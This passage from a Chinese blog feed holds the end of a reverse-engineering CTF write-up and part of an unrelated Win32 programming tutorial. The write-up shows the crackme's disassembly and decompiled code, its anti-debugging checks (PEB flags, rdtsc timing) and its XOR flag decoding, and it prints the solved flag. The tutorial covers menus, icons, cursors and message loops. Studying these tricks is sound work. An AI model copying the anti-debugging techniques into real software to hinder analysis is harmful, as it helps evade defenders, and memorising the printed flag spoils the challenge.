class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs assembly">_main:                        ; CODE XREF: ___tmainCRTStartup+2C3↑p<br>.text:00401620                               ; DATA XREF: _mainCRTStartup_0+6A↓o<br>.text:00401620 push    ebp<br>.text:00401621 mov     ebp, esp<br>.text:00401623 xor     eax, eax<br>.text:00401625 xor     edx, edx<br>.text:00401627 mov     eax, large fs:30h<br>.text:0040162D mov     al, [eax+2]<br>.text:00401630 mov     dl, al<br>.text:00401632 cmp     al, 0<br>.text:00401634 jnz     short _d<br>.text:00401634<br>.text:00401636 jmp     $+5<br>.text:00401636<br>.text:0040163B ; ---------------------------------------------------------------------------<br>.text:0040163B<br>.text:0040163B _G:                           ; CODE XREF: .text:00401636↑j<br>.text:0040163B xor     eax, eax<br>.text:0040163D xor     edx, edx<br>.text:0040163F mov     eax, large fs:30h<br>.text:00401645 mov     al, [eax+68h]<br>.text:00401648 mov     dl, al<br>.text:0040164A cmp     al, 0<br>.text:0040164C jnz     short _d<br>.text:0040164C<br>.text:0040164E rdtsc<br>.text:00401650 mov     ebx, eax<br>.text:00401652 push    ecx<br>.text:00401653 pop     ecx<br>.text:00401654 add     edi, edi<br>.text:00401656 sub     edi, edi<br>.text:00401658 push    esi<br>.text:00401659 pop     esi<br>.text:0040165A add     ecx, ecx<br>.text:0040165C sub     ecx, ecx<br>.text:0040165E push    esi<br>.text:0040165F pop     esi<br>.text:00401660 add     edi, edi<br>.text:00401662 sub     edi, edi<br>.text:00401664 push    ecx<br>.text:00401665 pop     ecx<br>.text:00401666 add     ecx, ecx<br>.text:00401668 sub     ecx, ecx<br>.text:0040166A add     edi, edi<br>.text:0040166C sub     edi, edi<br>.text:0040166E push    esi<br>.text:0040166F pop     esi<br>.text:00401670 rdtsc<br>.text:00401672 sub     eax, ebx<br>.text:00401674 cmp     eax, 3E8h<br>.text:00401679 jg      short _d<br>.text:00401679<br>.text:0040167B jmp     _n<br>.text:0040167B<br>.text:00401680 ; ---------------------------------------------------------------------------<br>.text:00401680<br>.text:00401680 _d:                           ; CODE XREF: .text:00401634↑j<br>.text:00401680                               ; .text:0040164C↑j<br>.text:00401680                               ; .text:00401679↑j<br>.text:00401680 push    offset __data_start__ ; &quot;Looks like your doing something naughty&quot;...<br>.text:00401685 call    _printf<br>.text:00401685<br>.text:0040168A add     esp, 4<br>.text:00401690 mov     esp, ebp<br>.text:00401692 pop     ebp<br>.text:00401693 retn<br>.text:00401693<br>.text:00401694 ; ---------------------------------------------------------------------------<br>.text:00401694<br>.text:00401694 _n:                           ; CODE XREF: .text:0040167B↑j<br>.text:00401694 push    offset m1             ; &quot;I heard you like bugs so I put bugs in &quot;...<br>.text:00401699 call    _printf<br>.text:00401699<br>.text:0040169E add     esp, 4<br>.text:004016A4 push    offset m2             ; &quot;Seriously though try and find the flag,&quot;...<br>.text:004016A9 call    _printf<br>.text:004016A9<br>.text:004016AE add     esp, 4<br>.text:004016B4 xor     eax, eax<br>.text:004016B6 mov     eax, 6A253E2Dh<br>.text:004016BB push    eax<br>.text:004016BC jmp     $+5<br>.text:004016BC<br>.text:004016C1 ; ---------------------------------------------------------------------------<br>.text:004016C1<br>.text:004016C1 _lol:                         ; CODE XREF: .text:004016BC↑j<br>.text:004016C1 sub     eax, 560C29FCh<br>.text:004016C6 push    eax<br>.text:004016C7 jmp     $+5<br>.text:004016C7<br>.text:004016CC ; ---------------------------------------------------------------------------<br>.text:004016CC<br>.text:004016CC _yaya:                        ; CODE XREF: .text:004016C7↑j<br>.text:004016CC and     eax, 41414141h<br>.text:004016D1 and     eax, 3E3E3E3Eh<br>.text:004016D6 mov     eax, 6A253E2Dh<br>.text:004016DB sub     eax, 49FD1BF4h<br>.text:004016E0 push    eax<br>.text:004016E1 jmp     $+5<br>.text:004016E1<br>.text:004016E6 ; ---------------------------------------------------------------------------<br>.text:004016E6<br>.text:004016E6 _lala:                        ; CODE XREF: .text:004016E1↑j<br>.text:004016E6 xor     eax, eax<br>.text:004016E8 mov     eax, 6A253E2Dh<br>.text:004016ED sub     eax, 2B1124FFh<br>.text:004016F2 push    eax<br>.text:004016F3 jmp     $+5<br>.text:004016F3<br>.text:004016F8 ; ---------------------------------------------------------------------------<br>.text:004016F8<br>.text:004016F8 _dsfghtgf:                    ; CODE XREF: .text:004016F3↑j<br>.text:004016F8 and     eax, 41414141h<br>.text:004016FD and     eax, 3E3E3E3Eh<br>.text:00401702 mov     eax, 6A253E2Dh<br>.text:00401707 sub     eax, 5E190004h<br>.text:0040170C push    eax<br>.text:0040170D jmp     $+5<br>.text:0040170D<br>.text:00401712 ; ---------------------------------------------------------------------------<br>.text:00401712<br>.text:00401712 _ertrwe:                      ; CODE XREF: .text:0040170D↑j<br>.text:00401712 and     eax, 41414141h<br>.text:00401717 and     eax, 3E3E3E3Eh<br>.text:0040171C mov     eax, 6A253E2Dh<br>.text:00401721 add     eax, 0DE9D64Dh<br>.text:00401726 push    eax<br>.text:00401727 jmp     $+5<br>.text:00401727<br>.text:0040172C ; ---------------------------------------------------------------------------<br>.text:0040172C<br>.text:0040172C _kjnjk:                       ; CODE XREF: .text:00401727↑j<br>.text:0040172C xor     eax, eax<br>.text:0040172E mov     eax, 6A253E2Dh<br>.text:00401733 sub     eax, 2B003419h<br>.text:00401738 push    eax<br>.text:00401739 jmp     $+5<br>.text:00401739<br>.text:0040173E ; ---------------------------------------------------------------------------<br>.text:0040173E<br>.text:0040173E _qsacb:                       ; CODE XREF: .text:00401739↑j<br>.text:0040173E and     eax, 41414141h<br>.text:00401743 and     eax, 3E3E3E3Eh<br>.text:00401748 mov     eax, 6A253E2Dh<br>.text:0040174D sub     eax, 3E001C06h<br>.text:00401752 push    eax<br>.text:00401753 jmp     $+5<br>.text:00401753<br>.text:00401758 ; ---------------------------------------------------------------------------<br>.text:00401758<br>.text:00401758 _tftrtftc:                    ; CODE XREF: .text:00401753↑j<br>.text:00401758 and     eax, 41414141h<br>.text:0040175D and     eax, 3E3E3E3Eh<br>.text:00401762 mov     eax, 6A253E2Dh<br>.text:00401767 sub     eax, 42AA050Eh<br>.text:0040176C push    eax<br>.text:0040176D jmp     $+5<br>.text:0040176D<br>.text:00401772 ; ---------------------------------------------------------------------------<br>.text:00401772<br>.text:00401772 _sup:                         ; CODE XREF: .text:0040176D↑j<br>.text:00401772 push    esp<br>.text:00401773 pop     esi<br>.text:00401774 xor     edx, edx<br>.text:00401776 mov     edi, esi<br>.text:00401778 mov     edx, edi<br>.text:0040177A cld<br>.text:0040177B mov     ecx, 24h ; &#x27;$&#x27;<br>.text:00401780 mov     ebx, 4Bh ; &#x27;K&#x27;<br>.text:00401785 xor     eax, eax<br>.text:00401787 push    eax<br>.text:00401787<br>.text:00401788<br>.text:00401788 _l:                           ; CODE XREF: .text:0040178C↓j<br>.text:00401788 lodsb<br>.text:00401789 xor     eax, ebx<br>.text:0040178B stosb<br>.text:0040178C loop    _l<br>.text:0040178C<br>.text:0040178E mov     esp, ebp<br>.text:00401790 pop     ebp<br>.text:00401790<br>.text:00401791<br></code></pre></td></tr></table></figure><p>试图生成一下函数，按一下<code>P</code>进行生成</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// esi</span><br>  _BYTE *v8; <span class="hljs-comment">// edi</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// al</span><br>  _DWORD v11[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [esp-24h] [ebp-24h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Looks like your doing something naughty. Stop it!!!\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( LOBYTE(NtCurrentPeb()-&gt;NtGlobalFlag) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Looks like your doing something naughty. Stop it!!!\n&quot;</span>);<br>  v3 = __rdtsc();<br>  v4 = v3;<br>  v5 = __rdtsc();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)v5 - v4 &gt; <span class="hljs-number">1000</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Looks like your doing something naughty. Stop it!!!\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I heard you like bugs so I put bugs in your debugger so you can have bugs while you debug!!!\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Seriously though try and find the flag, you will find it in your debugger!!!\n&quot;</span>);<br>  v11[<span class="hljs-number">8</span>] = <span class="hljs-number">1780825645</span>;<br>  v11[<span class="hljs-number">7</span>] = <span class="hljs-number">337187889</span>;<br>  v11[<span class="hljs-number">6</span>] = <span class="hljs-number">539501113</span>;<br>  v11[<span class="hljs-number">5</span>] = <span class="hljs-number">1058281774</span>;<br>  v11[<span class="hljs-number">4</span>] = <span class="hljs-number">202128937</span>;<br>  v11[<span class="hljs-number">3</span>] = <span class="hljs-number">2014254202</span>;<br>  v11[<span class="hljs-number">2</span>] = <span class="hljs-number">1059392020</span>;<br>  v11[<span class="hljs-number">1</span>] = <span class="hljs-number">740631079</span>;<br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">662386975</span>;<br>  v7 = (<span class="hljs-keyword">char</span> *)v11;<br>  v8 = v11;<br>  v9 = <span class="hljs-number">36</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v10 = *v7++;<br>    *v8++ = v10 ^ <span class="hljs-number">0x4B</span>;<br>    --v9;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 );<br>  <span class="hljs-keyword">return</span> sub_401791(<span class="hljs-number">0</span>, v11);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以很清楚的看到程序执行的过程了，对其进行分析即可！</p><blockquote><p>主要的加密过程还是异或，其实可以直接自己计算的，但是异或具有对称性，我们直接借助调试器进行解密即可</p></blockquote><p>需要注意的是程序在里面还是有反调试，会弹出对应的语句注意绕过即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Looks like your doing something naughty. Stop it!!!<br></code></pre></td></tr></table></figure><p>最终可以得到<code>FLAG</code></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Tr0lling_Ant1_D3buGGeR_trickz_R_fun!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Win 32 编程</title>
    <link href="/2022/04/07/Win32%20%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/04/07/Win32%20%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="程序分类">程序分类</h2><h3 id="控制台应用程序-DOS-程序">控制台应用程序(DOS 程序)</h3><p>本质上是一个<code>DOS</code>程序，本身没有窗口，通过<code>Windows DOS</code>窗口执行</p><h3 id="窗口程序">窗口程序</h3><p>拥有自己的窗口，可以与用户交互</p><h3 id="库程序">库程序</h3><p>存放代码数据的程序，执行文件可以从中取出代码执行和获取数据</p><ul><li>静态库程序：扩展名<code>lib</code>，在编译链接程序时，将代码放入到执行文件中，无法执行 ( 没有入口函数 )</li><li>动态库程序：扩展名<code>dll</code>，执行文件时从中获取代码，不能独立运行，需要依附其他程序运行 ( 有入口函数 )</li></ul><h2 id="编译工具">编译工具</h2><p>编译器<code>cl.exe</code>：将源代码编译成目标代码<code>.obj</code><br>链接器<code>link.exe</code>：将目标代码、库链接生成最终文件<br>资源编译器<code>rc.exe</code>：( .rc ) 将资源编译，最终通过链接器存入最终文件 ( 一种脚本语言 )</p><h2 id="库函数">库函数</h2><p><code>kernel32.dll</code>：提供了核心的<code>API</code>，例如进程、线程、内存管理等<br><code>user32.dll</code>：提供了窗口、消息等<code>API</code><br><code>gdi32.dll</code>：绘图相关的<code>API</code></p><h2 id="头文件">头文件</h2><p><code>windows.h</code>：所有<code>Windows</code>头文件的集合<br><code>windef.h</code>：<code>Windows</code>数据类型 ( <code>typdef</code>对基本数据类型取别名实现的 )<br><code>winbase.h</code>：<code>kernel32</code>的<code>API</code><br><code>wingdi.h</code>：<code>gdi32</code>的<code>API</code><br><code>winuser.h</code>：<code>user32</code>的<code>API</code><br><code>winnt.h</code>：<code>Unicode</code>字符集支持</p><blockquote><p>一般写一个<code>Windows.h</code>即可</p></blockquote><h2 id="编译过程">编译过程</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">    CL.exe<br><span class="hljs-string">.c/.cpp----------------------</span>&gt; <span class="hljs-string">.obj</span>  | LINK.exe<br>RC.exe       | <span class="hljs-params">---------------------</span>&gt; <span class="hljs-string">.exe</span> <br><span class="hljs-string">.rc--------------------------</span>&gt; <span class="hljs-string">.res</span>  |<br></code></pre></td></tr></table></figure><h2 id="宽字节字符">宽字节字符</h2><p><code>wchar_t</code>每个字符占两个字节，其本质上是<code>unsigned short</code>类型，定义时，需要增加 “L” ，通知编译器按照双字节编译字符串，采用<code>Unicode</code>编码，同时对宽字节字符串操作时需要使用相关支持宽字节的函数。<code>wprintf</code>对<code>Unicode</code>字符打印支持并不完善，在<code>Windows</code>下使用<code>WriteConsole</code>进行输出。</p><h2 id="窗口类">窗口类</h2><h3 id="概念">概念</h3><ul><li><p>窗口类包含了窗口的各种参数信息的数据结构</p></li><li><p>每个窗口都具有窗口类，基于窗口类创建窗口</p></li><li><p>每个窗口类都具有一个名称，使用前必须注册到系统</p></li></ul><h3 id="分类">分类</h3><p>系统窗口类：系统已经定义好的窗口类，所有应用程序都可以直接使用</p><p>应用程序全局窗口类：由用户自己定义，当前应用程序所有模块都可以直接使用</p><p>应用程序局部窗口类：由用户自己定义，当前应用程序中本模块可以使用</p><h2 id="资源类">资源类</h2><h3 id="菜单">菜单</h3><h4 id="分类-2">分类</h4><p>窗口的顶层菜单<br>弹出式菜单<br>系统菜单</p><p><code>HMENU</code>类型( 菜单句柄 )表示菜单，<code>ID</code>表示菜单项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HMENU <span class="hljs-title">LoadMenu</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">//handle to module</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpMenuName<span class="hljs-comment">// menu name or resource identifier</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>加载菜单资源</p><p>1&gt;注册窗口类时设置菜单<br>2&gt;创建窗口传参设置菜单<br>3&gt;在主窗口WM_CREATE消息中利用<code>SetMenu</code>函数设置菜单</p></blockquote><h3 id="图标">图标</h3><p>一个图标文件中可以有多个不同大小的图标</p><p>加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HICON <span class="hljs-title">LoadIcon</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">// handle to application instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpIconName <span class="hljs-comment">// name string or resource identifier</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//成功返回HICON句柄</span><br></code></pre></td></tr></table></figure><h3 id="光标">光标</h3><p>光标的大小默认是<code>32X32</code>像素，每个光标有<code>HotSpot</code>，是当前鼠标的热点</p><p>加载资源</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HCURSOR <span class="hljs-title">LoadCursor</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">// handle to application instance</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR lpCursorName <span class="hljs-comment">// name or resource identifier</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">// hInstance -可以为NULL，获取系统默认的Cursor</span><br></code></pre></td></tr></table></figure><blockquote><p>必须放在消息处理函数中定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HCURSOR <span class="hljs-title">SetCursor</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HCURSOR hCursor <span class="hljs-comment">// handle to cursor</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p><code>WM_SETCURSOR</code>消息参数</p><p><code>wPARAM</code>当前使用的光标句柄<br><code>lPARAM</code>：<code>LOWORD</code>当前区域的代码( Hit-Test code )<br><code>HTCLIENT</code>(  客户区域 ) 、<code>HTCAPTION</code>( 标题栏区域 )…<br><code>HIWORD</code>：当前鼠标消息ID</p></blockquote><p>设置资源</p><p>在注册窗口时，设置光标( 不方便随时改光标 )<br>使用<code>SetCursor</code>设置光标( 可以随时改光标 )</p><h3 id="字符串">字符串</h3><blockquote><p>方便实现中英文两版程序</p></blockquote><p>添加字符串资源</p><p>添加字符串表,在表中增加字符串</p><p>字符串资源的使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">LoadString</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">// handle to resource module</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT uID,<span class="hljs-comment">//字符串ID</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPTSTR IpBuffer,<span class="hljs-comment">//存放字符串BUI</span></span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nBufferMax <span class="hljs-comment">//字符串BUFF长度</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//成功返回字符串长度，失败0</span><br></code></pre></td></tr></table></figure><h3 id="加速键">加速键</h3><p>例如快捷键，可以添加对应的<code>ID</code>来对应的快捷操作</p><p>加载加速键表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HACCEL <span class="hljs-title">LoadAccelerators</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,<span class="hljs-comment">// handle to module</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPCTSTR IpTableName<span class="hljs-comment">// accelerator table name</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//返回加速键表句柄</span><br></code></pre></td></tr></table></figure><p>翻译加速键</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">TranslateAccelerator</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//处理消息的窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">HACCEL hAccTable,<span class="hljs-comment">//加速键表句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">LPMSG lpMsg <span class="hljs-comment">//消息</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<span class="hljs-comment">//如果是加速键，返回非零。</span><br></code></pre></td></tr></table></figure><p>在<code>WM_COMMAND</code>中相应消息，消息参数：</p><p><code>wPARAM</code> : <code>HIWORD</code>为 1 表示加速键，为 0 表示菜单。<code>LOWORD</code>为命令<code>ID</code>。</p><p><code>lParam</code> ：为0</p><h2 id="消息">消息</h2><h3 id="消息组成">消息组成</h3><p>窗口句柄、消息ID、消息的两个参数( 两个附带信息 )：消息产生的时间、消息产生时的鼠标位置</p><h3 id="消息作用">消息作用</h3><p>当系统通知窗口工作室，就采用消息的方式派发给窗口</p><h3 id="相关消息">相关消息</h3><table><thead><tr><th style="text-align:center">消息名</th><th style="text-align:center">产生时间</th><th style="text-align:center">附带消息</th><th style="text-align:center">一般用法</th></tr></thead><tbody><tr><td style="text-align:center">WM_DESTORY</td><td style="text-align:center">窗口被销毁时的消息</td><td style="text-align:center"><code>wParam</code>为 0 ，<code> lPARAM</code>为 0</td><td style="text-align:center">常用于在窗口被销毁之前，做对应的善后处理，例如资源、内存等。</td></tr><tr><td style="text-align:center">WM_SYSCOMMAND</td><td style="text-align:center">当点击窗口的最大化、最小化、关闭等</td><td style="text-align:center"><code>wParam</code>为具体点击位置，例如关闭SC_CLOSE等 ，<code> lPARAM</code>为鼠标光标的位置。<code>LOWORD(lPARAM);//水平位置HIWORD(lPARAM);//垂直位置</code></td><td style="text-align:center">常用在窗口关闭时，提示用户处理</td></tr><tr><td style="text-align:center">WM_CREATE</td><td style="text-align:center">窗口创建成功但是还未显示时</td><td style="text-align:center"><code>wParam</code>为 0 ，<code> lPARAM</code>为 <code>CREATESTRUCT</code>类型的指针。通过这个指针可以获取<code>CreatWindowEX</code>中全部的12个参数的信息</td><td style="text-align:center">常用于初始化窗口的函数、资源等，包括创建子窗口的等</td></tr><tr><td style="text-align:center">WM_SIZE</td><td style="text-align:center">窗口的大小法神变化后，窗口刚产生时</td><td style="text-align:center"><code>wParam</code>为窗口变化的原因 ，<code> lPARAM</code>为窗口变化后的大小。<code>LOWORD(lPARAM);//变化后的宽度HIWORD(lPARAM);//变化后的高度</code></td><td style="text-align:center">常用于窗口大小变化后，调整窗口内各个部分的布局</td></tr><tr><td style="text-align:center">WM_QUIT</td><td style="text-align:center">程序员发送</td><td style="text-align:center"><code>wParam</code>为<code>PostQuitMessage</code>传递的参数 ，<code> lPARAM</code>为 0</td><td style="text-align:center">用于结束消息循环，当<code>GetMessage</code>收到这个消息后，返回<code>FALSE</code>，结束<code>while</code>处理，退出消息循环</td></tr><tr><td style="text-align:center">WM_PAINT</td><td style="text-align:center">当窗口需要绘制的时候</td><td style="text-align:center"><code>wParam</code>为 0 ，<code> lPARAM</code>为 0</td><td style="text-align:center">用于绘图</td></tr><tr><td style="text-align:center">…</td><td style="text-align:center">…</td><td style="text-align:center">…</td><td style="text-align:center">…</td></tr></tbody></table><h3 id="消息的阻塞">消息的阻塞</h3><p><code>GetMessage</code>：从系统获取消息，将消息从系统中移除，阻塞函数。当系统无消息时，会等候下—条消息。<br><code>PeekMessage</code>：以查看的方式从系统获取消息，可以不将消息从系统移除，非阻塞函数。当系统无消息时，返回<code>FALSE</code>，继续执行后续代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">PeekMessage</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">LPMSG lpMsg,<span class="hljs-comment">// message information</span></span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">// handle to window</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT wMsgFilterMin，<span class="hljs-comment">// first message</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT wMsgFilterMax，<span class="hljs-comment">// last message</span></span></span><br><span class="hljs-params"><span class="hljs-function">UINT wRemoveMsg<span class="hljs-comment">//移除标识</span></span></span><br><span class="hljs-params"><span class="hljs-function">PM_REMOVE/PM_NOREMOVE</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><p>消息循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">if</span>(PeekMessage(&amp;nMsg,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,PM_NOREMOVE))&#123;<br><span class="hljs-comment">//有消息</span><br><span class="hljs-keyword">if</span>(GetMessage(&amp;nMsg,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))&#123;<br>TranslateMessage(&amp;nMsg);<br>DispatchMessage(&amp;nMsg);<span class="hljs-comment">//将消息交给窗口处理函数来处理</span><br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//无消息</span><br>wprintf(<span class="hljs-string">L&quot;NO MESSAGE\n&quot;</span>);<br>Sleep(<span class="hljs-number">100</span>); <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="发送消息">发送消息</h3><p><code>SendMessage</code>：发送消息(直接发送到自己定义的消息处理函数)，会等候消息处理的结果。消息未处理完会造成阻塞。<br><code>PostMessage</code>：投递消息(发送到系统队列)，消息发出后立刻返回，不等候消息执行结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL SendMessage/PostMessage(<br>HWND hWnd,<span class="hljs-comment">//消息发送的目的窗口</span><br>UINT Msg,<span class="hljs-comment">//消息ID</span><br>WPARAM wParam,<span class="hljs-comment">//消息参数</span><br>LPARAM lParam <span class="hljs-comment">//消息参数</span><br>)<br></code></pre></td></tr></table></figure><p>系统消息：ID 范围<code>0 - 0x03FF</code><br>由系统定义好的消息，可以在程序中直接使用。<br>用户自定义消息：ID 范围<code>0x0400 - 0x7FFF(31743)</code><br>由用户自己定义，满足用户自己的需求。由用户自己发出消息，并响应处理。<br>自定义消息宏:<code>WM_USER</code></p><h3 id="消息队列">消息队列</h3><h4 id="概念-2">概念</h4><ul><li>消息队列是用于存放消息的队列。</li><li>消息在队列中先入先出。</li><li>所有窗口程序都具有消息队列。</li><li>程序可以从队列中获取消息。</li></ul><h4 